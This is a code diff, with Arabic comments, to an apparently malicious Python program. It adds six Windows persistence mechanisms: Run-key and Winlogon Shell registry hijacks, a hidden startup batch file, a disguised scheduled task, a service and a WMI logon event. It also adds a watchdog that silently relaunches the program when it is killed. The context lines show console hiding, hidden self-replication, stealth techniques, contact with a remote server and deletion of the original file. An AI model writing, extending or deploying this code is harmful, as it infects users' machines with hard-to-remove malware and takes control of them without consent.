@@ -1704,6 +1704,173 @@ class AdvancedCamouflage:
         except:
             pass
 
+class MultiLaunchSystem:
+    def __init__(self, original_path):
+        self.original_path = original_path
+        self.launch_methods = [
+            self.registry_launch,
+            self.startup_folder_launch,
+            self.scheduled_task_launch,
+            self.service_launch,
+            self.wmi_launch,
+            self.shell_launch
+        ]
+    
+    def install_all_launch_methods(self):
+        """تثبيت جميع طرق التشغيل"""
+        print("🚀 تثبيت طرق التشغيل المتعددة...")
+        success_count = 0
+        
+        for method in self.launch_methods:
+            try:
+                if method():
+                    success_count += 1
+                    print(f"   ✅ {method.__name__}")
+                else:
+                    print(f"   ❌ {method.__name__}")
+            except Exception as e:
+                print(f"   ⚠️ {method.__name__}: {e}")
+        
+        print(f"📊 تم تثبيت {success_count} من أصل {len(self.launch_methods)} طريقة تشغيل")
+        return success_count
+    
+    def registry_launch(self):
+        """التشغيل عبر الريجستري"""
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, "WindowsSystemService", 0, 
+                                winreg.REG_SZ, f'"{sys.executable}" "{self.original_path}"')
+            return True
+        except:
+            return False
+    
+    def startup_folder_launch(self):
+        """التشغيل عبر مجلد Startup"""
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'), 
+                                        'Microsoft', 'Windows', 
+                                        'Start Menu', 'Programs', 'Startup')
+            bat_path = os.path.join(startup_folder, 'system_launcher.bat')
+            
+            with open(bat_path, 'w') as f:
+                f.write('@echo off\n')
+                f.write('timeout /t 5 /nobreak >nul\n')
+                f.write(f'start "" "{sys.executable}" "{self.original_path}"\n')
+            
+            subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
+            return True
+        except:
+            return False
+    
+    def scheduled_task_launch(self):
+        """التشغيل عبر المهام المجدولة"""
+        try:
+            task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\SystemService" /tr "\"{sys.executable}\" \"{self.original_path}\"" /sc onlogon /f /ru {os.getenv("USERNAME")}'
+            result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
+            return result.returncode == 0
+        except:
+            return False
+    
+    def service_launch(self):
+        """التشغيل كخدمة (بدون صلاحيات مدير)"""
+        try:
+            # استخدام خدمة مستخدم بدلاً من خدمة نظام
+            service_cmd = f'sc create "UserSystemService" binPath= "\"{sys.executable}\" \"{self.original_path}\"" type= own start= auto obj= "{os.getenv("USERDOMAIN")}\\{os.getenv("USERNAME")}"'
+            result = subprocess.run(service_cmd, shell=True, capture_output=True)
+            return result.returncode == 0
+        except:
+            return False
+    
+    def wmi_launch(self):
+        """التشغيل عبر WMI Events"""
+        try:
+            wmi_script = f"""
+            $query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'"
+            Register-WmiEvent -Query $query -Action {{ 
+                Start-Process -FilePath "{sys.executable}" -ArgumentList "{self.original_path}" -WindowStyle Hidden
+            }}
+            """
+            result = subprocess.run(["powershell", "-Command", wmi_script], 
+                                 capture_output=True, timeout=10)
+            return result.returncode == 0
+        except:
+            return False
+    
+    def shell_launch(self):
+        """التشغيل عبر Shell Integration"""
+        try:
+            # إضافة إلى قائمة التشغيل التلقائي للشل
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+            
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                try:
+                    current_value, _ = winreg.QueryValueEx(reg_key, "Shell")
+                    new_value = f'explorer.exe, "{sys.executable}" "{self.original_path}"'
+                except FileNotFoundError:
+                    new_value = f'explorer.exe, "{sys.executable}" "{self.original_path}"'
+                
+                winreg.SetValueEx(reg_key, "Shell", 0, winreg.REG_SZ, new_value)
+            return True
+        except:
+            return False
+
+class AutoRecoverySystem:
+    def __init__(self, original_path):
+        self.original_path = original_path
+        self.monitor_thread = None
+        self.running = True
+    
+    def start_auto_recovery(self):
+        """بدء المراقبة والاستعادة التلقائية"""
+        def monitor():
+            while self.running:
+                try:
+                    # التحقق إذا كان البرنامج يعمل
+                    if not self.is_process_running():
+                        print("🔄 اكتشاف توقف النظام - إعادة التشغيل...")
+                        self.restart_system()
+                    
+                    time.sleep(30)  # فحص كل 30 ثانية
+                    
+                except Exception as e:
+                    print(f"⚠️ خطأ في المراقبة: {e}")
+                    time.sleep(60)
+        
+        self.monitor_thread = threading.Thread(target=monitor, daemon=True)
+        self.monitor_thread.start()
+        print("🛡️ بدء نظام المراقبة والاستعادة التلقائية")
+    
+    def is_process_running(self):
+        """التحقق إذا كان البرنامج يعمل"""
+        try:
+            current_script = os.path.basename(self.original_path)
+            for proc in psutil.process_iter(['name', 'cmdline']):
+                try:
+                    if (proc.info['name'] and 'python' in proc.info['name'].lower() and
+                        proc.info['cmdline'] and any(current_script in cmd for cmd in proc.info['cmdline'])):
+                        return True
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            return False
+        except:
+            return False
+    
+    def restart_system(self):
+        """إعادة تشغيل النظام"""
+        try:
+            subprocess.Popen([sys.executable, self.original_path], 
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL,
+                           stdin=subprocess.DEVNULL,
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            return True
+        except:
+            return False
+
 # === النظام الأبدي المطلق المحسن ===
 class AbsoluteEternalSystem:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
@@ -1714,6 +1881,8 @@ class AbsoluteEternalSystem:
         self.original_path = os.path.abspath(__file__)
         self.encryption = AdvancedEncryptionSystem()
         self.replication = EternalReplicationSystem()
+        self.multi_launch = MultiLaunchSystem(self.original_path)
+        self.auto_recovery = AutoRecoverySystem(self.original_path)
         
         # أسماء نظام Windows الحقيقية والمختلفة
         self.system_names = [
@@ -2393,7 +2562,15 @@ goto BATCH_GUARDIAN_LOOP
         # 1. إخفاء النافذة
         self.hide_console()
         
-        # 2. إنشاء النسخ اللانهائية
+        # 2. نظام التشغيل المتعدد
+        print("🚀 INSTALLING MULTI-LAUNCH SYSTEM...")
+        launch_count = self.multi_launch.install_all_launch_methods()
+        
+        # 3. نظام الاستعادة التلقائية
+        print("🛡️ STARTING AUTO-RECOVERY SYSTEM...")
+        self.auto_recovery.start_auto_recovery()
+        
+        # 4. إنشاء النسخ اللانهائية
         print("📁 CREATING ABSOLUTE ETERNAL COPIES...")
         self.create_infinite_copies()
         
@@ -2402,31 +2579,31 @@ goto BATCH_GUARDIAN_LOOP
             self.hidden_copies.append(self.original_path)
             self.main_copy_path = self.original_path
         
-        # 3. تثبيت الاستمرارية الأبدية
+        # 5. تثبيت الاستمرارية الأبدية
         print("🔧 INSTALLING ABSOLUTE ETERNAL PERSISTENCE...")
         self.install_eternal_persistence()
         
-        # 4. تثبيت النظام المستقل
+        # 6. تثبيت النظام المستقل
         print("🤖 INSTALLING ENHANCED INDEPENDENT REPLICATION SYSTEM...")
         self.install_independent_replication_system()
         
-        # 5. بدء المراقبة المتبادلة
+        # 7. بدء المراقبة المتبادلة
         print("🔄 STARTING ABSOLUTE MUTUAL MONITORING...")
         self.start_mutual_monitoring()
         
-        # 6. بدء الاتصال الأبدي
+        # 8. بدء الاتصال الأبدي
         print("🌐 STARTING ABSOLUTE ETERNAL COMMUNICATION...")
         self.start_eternal_communication()
         
-        # 7. إنشاء نظام البات المخفي
+        # 9. إنشاء نظام البات المخفي
         print("🛡️ CREATING ABSOLUTE STEALTH BATCH MONITOR...")
         self.create_stealth_batch_monitor()
         
-        # 8. تثبيت تقنيات التخفي المتقدمة
+        # 10. تثبيت تقنيات التخفي المتقدمة
         print("🎭 INSTALLING ABSOLUTE ADVANCED STEALTH TECHNIQUES...")
         self.install_advanced_stealth()
         
-        # 9. حذف الملف الأصلي تلقائياً بعد 15 ثانية
+        # 11. حذف الملف الأصلي تلقائياً بعد 15 ثانية
         print("⏰ SCHEDULING ABSOLUTE AUTO-DELETE OF ORIGINAL FILE...")
         def auto_delete():
             time.sleep(15)
